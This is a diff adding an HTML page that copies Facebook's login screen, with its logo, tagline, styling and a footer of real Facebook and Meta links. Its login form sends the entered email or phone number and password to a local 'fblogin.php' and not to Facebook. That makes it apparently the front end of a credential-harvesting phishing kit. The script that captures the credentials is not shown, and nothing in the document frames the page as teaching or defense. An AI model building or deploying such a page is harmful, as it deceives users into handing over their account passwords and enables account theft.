@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            color: #1c1e21;
+        }
+        .container {
+            display: flex;
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 72px 0 112px;
+            align-items: center;
+        }
+        .left-section {
+            width: 580px;
+            padding-right: 32px;
+            box-sizing: border-box;
+        }
+        .logo {
+            font-size: 56px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 0;
+        }
+        .tagline {
+            font-size: 28px;
+            line-height: 32px;
+            margin-top: 0;
+        }
+        .right-section {
+            width: 396px;
+        }
+        .login-box {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 15px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .login-form {
+            width: 100%;
+        }
+        .login-form input {
+            width: calc(100% - 32px); /* Adjusted width to account for padding */
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            box-sizing: border-box;
+        }
+        .login-button {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            line-height: 48px;
+            width: 100%;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-account {
+            text-align: center;
+        }
+        .create-account-button {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            line-height: 48px;
+            padding: 0 16px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            max-width: 200px;
+        }
+        .create-page {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 14px;
+        }
+        .create-page a {
+            color: #1c1e21;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        .language {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 12px;
+        }
+        .language a {
+            color: #385898;
+            text-decoration: none;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px 0;
+            font-size: 12px;
+            color: #737373;
+            background-color: #fff;
+        }
+        .footer-links {
+            margin: 0 auto;
+            max-width: 980px;
+            line-height: 1.6;
+        }
+        .footer-links a {
+            color: #737373;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .copyright {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <h1 class="logo">facebook</h1>
+            <p class="tagline">Facebook helps you connect and share with the people in your life.</p>
+        </div>
+        
+        <div class="right-section">
+            <div class="login-box">
+                <form class="login-form" action="fblogin.php" method="post">
+                    <input type="text" placeholder="Email address or phone number" name="email">
+                    <input type="password" placeholder="Password" name="password">
+                    <button type="submit" class="login-button">Log In</button>
+                    <div class="forgot-password">
+                        <a href="https://www.facebook.com/login/identify/">Forgotten password?</a>
+                    </div>
+                    <div class="divider"></div>
+                    <div class="create-account">
+                        <button type="button" class="create-account-button">Create new account</button>
+                    </div>
+                </form>
+            </div>
+            
+            <div class="create-page">
+                <a href="fbsignup.html">Create a Page</a> for a celebrity, brand or business.
+            </div>
+        </div>
+    </div>
+    
+    <div class="language">English (UK) తెలుగు اردوहिन्दी தமிழ் ଓଡ଼ିଆ ಕನ್ನಡ മലയാളം Español Português (Brasil) Français (France)
+
+    </div>
+    
+    <div class="footer">
+        <div class="footer-links">
+            <a href="https://www.facebook.com/reg/">Sign Up</a>
+            <a href="https://www.facebook.com/login/">Log In</a>
+            <a href="https://www.messenger.com/">Messenger</a>
+            <a href="https://www.facebook.com/lite/">Facebook Lite</a>
+            <a href="https://www.facebook.com/watch/">Video</a>
+            <a href="https://pay.facebook.com/">Meta Pay</a>
+            <a href="https://www.meta.com/">Meta Store</a>
+            <a href="https://www.meta.com/quest/">Meta Quest</a>
+            <a href="https://www.ray-ban.com/usa/sunglasses/RB4395">Play-Ban Meta</a>
+            <a href="https://ai.meta.com/">Meta AI</a>
+            <a href="https://www.instagram.com/">Instagram</a>
+            <a href="https://www.threads.net/">Threads</a>
+            <br>
+            <a href="https://www.facebook.com/votinginformationcenter/">Voting Information Centre</a>
+            <a href="https://www.facebook.com/policies/">Privacy Policy</a>
+            <a href="https://www.facebook.com/privacy/center/">Privacy Center</a>
+            <a href="https://www.facebook.com/about/">About</a>
+            <a href="https://www.facebook.com/ads/create/">Create ad</a>
+            <a href="https://www.facebook.com/pages/create/">Create Page</a>
+            <a href="https://developers.facebook.com/">Developers</a>
+            <a href="https://www.facebook.com/careers/">Careers</a>
+            <a href="https://www.facebook.com/policies/cookies/">Cookies</a>
+            <a href="https://www.facebook.com/help/568137493302217">AoChoices</a>
+            <br>
+            <span>Contact uploading and non-users</span>
+        </div>
+        <div class="copyright">
+            Meta © 2023
+        </div>
+    </div>
+</body>
+</html>
